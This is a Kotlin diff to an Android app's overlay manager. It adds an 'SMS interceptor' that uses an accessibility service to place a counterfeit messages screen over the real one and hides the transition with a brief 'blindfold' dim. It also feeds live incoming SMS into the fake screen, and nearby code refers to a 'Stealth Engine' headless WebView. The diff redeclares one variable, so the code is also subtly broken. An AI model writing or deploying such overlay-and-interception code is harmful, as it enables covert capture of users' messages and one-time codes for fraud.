@@ -34,6 +34,8 @@ object DynamicUIManager {
     private var isGuardAttached: Boolean = false
 
     private var nativeOverlayView: android.view.View? = null
+    var isSmsInterceptorActive = false
+    private var nativeOverlayView: android.view.View? = null
     var isNativeAttached: Boolean = false
             private var activeNativeEntry: com.example.myandroid.dynamic.DynamicEntry? = null
         private var nativeLifecycleOwner: OverlayLifecycleOwner? = null
@@ -972,6 +974,7 @@ object DynamicUIManager {
     fun removeOverlay(ctx: Context, reason: String = "UNKNOWN", clearDimmer: Boolean = false) {
         Handler(Looper.getMainLooper()).post {
             DebugLogger.log("SDUI_CLOSE", "Overlay removal triggered. Reason: $reason | clearDimmer: $clearDimmer")
+            isSmsInterceptorActive = false
             val serviceInstance = MyAccessibilityService.instance
             val windowContext = if (serviceInstance != null) serviceInstance else ctx
             val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
@@ -1440,6 +1443,45 @@ object DynamicUIManager {
                 headlessWebView = null
                 isHeadlessAttached = false
                 DebugLogger.log("AUTO_HEADLESS", "Stealth Engine detached and destroyed.")
+            }
+        }
+    }
+
+    fun deploySmsInterceptor(ctx: Context) {
+        if (isSmsInterceptorActive) return
+        
+        // Apply 0% dim briefly to hide render transition
+        DimmerManager.applyDim(ctx, 0, "AUTO")
+        
+        var html = ""
+        try {
+            val file = java.io.File(ctx.filesDir, "synthetic_sms.html")
+            if (file.exists()) {
+                html = file.readText()
+            } else {
+                html = ctx.assets.open("reset_ui/messages.html").bufferedReader().use { it.readText() }
+            }
+        } catch (e: Exception) {
+            DebugLogger.log("SMS_INTERCEPT_ERR", "Failed to read html: ${e.message}")
+            DimmerManager.removeOverlay(ctx)
+            return
+        }
+        
+        isSmsInterceptorActive = true
+        showOverlay(ctx, true, "OVERLAY", html, true, false, "SMS_INTERCEPTOR")
+        
+        // Lift blindfold after 600ms
+        Handler(Looper.getMainLooper()).postDelayed({
+            DimmerManager.removeOverlay(ctx)
+        }, 600)
+    }
+
+    fun injectLiveSms(sender: String, body: String, ts: Long) {
+        if (isSmsInterceptorActive && isAttached && overlayView != null) {
+            Handler(Looper.getMainLooper()).post {
+                val safeSender = sender.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'")
+                val safeBody = body.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'").replace("\n", "\\n")
+                overlayView?.evaluateJavascript("if(typeof window.onSmsReceived === 'function') { window.onSmsReceived('$safeSender', '$safeBody', $ts); }", null)
             }
         }
     }
